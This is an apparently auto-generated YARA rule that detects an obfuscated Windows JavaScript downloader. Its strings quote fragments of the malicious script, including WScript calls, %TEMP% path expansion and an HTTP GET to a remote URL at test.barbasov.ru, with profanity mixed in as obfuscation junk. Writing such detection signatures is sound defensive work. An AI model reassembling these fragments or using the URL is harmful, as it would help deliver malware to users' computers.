rule sig_20160428_19fa0d986802e00dcd3224273799fec0 {
  meta:
    description = "datamaliciousorder - file 20160428_19fa0d986802e00dcd3224273799fec0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d789f7bc9258bfb0d77a70f269c986f25f12ff3de994dede01676652f24e3354"

  strings:
    $s1  = "function NfpZbpClyBjcNsvGikBej(VpyDdaYdmPlqMypVtcJbp){OzgYpmCuiZtoBlmMgbFbh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function NfpZbpClyBjcNsvGikBej(VpyDdaYdmPlqMypVtcJbp){OzgYpmCuiZtoBlmMgbFbh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function PcpQrkYfnKqpEqqNpbWgf() {return OzgYpmCuiZtoBlmMgbFbh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var OzgYpmCuiZtoBlmMgbFbh = function OvfYmwRahDapKhxVhqXip() {return SstIawLfgExqHclWtnOms[OycBunAgtHphIzoZcvMbw](\"WScript\"+\"" ascii
    $s5  = "function FbuVflVkkIfbCkoOoxKop(NijWpoXugBomFovEwfSbu, YuyYvhGgxGdyRvmSlfDtu){WjgSluJvvAfaPdcIlhJoj = WjgSluJvvAfaPdcIlhJoj * 1; " ascii
    $s6  = "return NijWpoXugBomFovEwfSbu - YuyYvhGgxGdyRvmSlfDtu;};" fullword ascii
    $s7  = "DvwCtgXzxNndMxlVrpAfx[JgzXkeDymQupRypLcpNrz](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "var SstIawLfgExqHclWtnOms = this[\"WScript\"];" fullword ascii
    $s9  = "var OzgYpmCuiZtoBlmMgbFbh = function OvfYmwRahDapKhxVhqXip() {return SstIawLfgExqHclWtnOms[OycBunAgtHphIzoZcvMbw](\"WScript\"+\"" ascii
    $s10 = "function PcpQrkYfnKqpEqqNpbWgf() {return OzgYpmCuiZtoBlmMgbFbh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function FbuVflVkkIfbCkoOoxKop(NijWpoXugBomFovEwfSbu, YuyYvhGgxGdyRvmSlfDtu){WjgSluJvvAfaPdcIlhJoj = WjgSluJvvAfaPdcIlhJoj * 1; " ascii
    $s12 = "if (DvwCtgXzxNndMxlVrpAfx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function SxyIptRbsNdsWiwIbjUpc(){return DngRurByjPovWnjIrzUuw + \"\";};" fullword ascii
    $s14 = "function DesNrjOwaEgiYduEfrVav() {return ((LnlHxoMmpBqaVxpEziYft == true) && (LnlHxoMmpBqaVxpEziYft == MoxJrgNgpGheUibHliXsm)) ?" ascii
    $s15 = "function AxnCczUncBjkKeyQepAbw(FrkXcqVvsGxhSahMjeSpb) {var FrdNhvKbxDcfAliBezYsy = (1, 2, 3, 4, 5, FrkXcqVvsGxhSahMjeSpb); retur" ascii
    $s16 = "function AxnCczUncBjkKeyQepAbw(FrkXcqVvsGxhSahMjeSpb) {var FrdNhvKbxDcfAliBezYsy = (1, 2, 3, 4, 5, FrkXcqVvsGxhSahMjeSpb); retur" ascii
    $s17 = "function DesNrjOwaEgiYduEfrVav() {return ((LnlHxoMmpBqaVxpEziYft == true) && (LnlHxoMmpBqaVxpEziYft == MoxJrgNgpGheUibHliXsm)) ?" ascii
    $s18 = "MoxJrgNgpGheUibHliXsm = true; " fullword ascii
    $s19 = "var UycFtbCcoKvaKraVymEkh = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "function SosVogQxbGonPsxHztJuf(){return OycBunAgtHphIzoZcvMbw;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}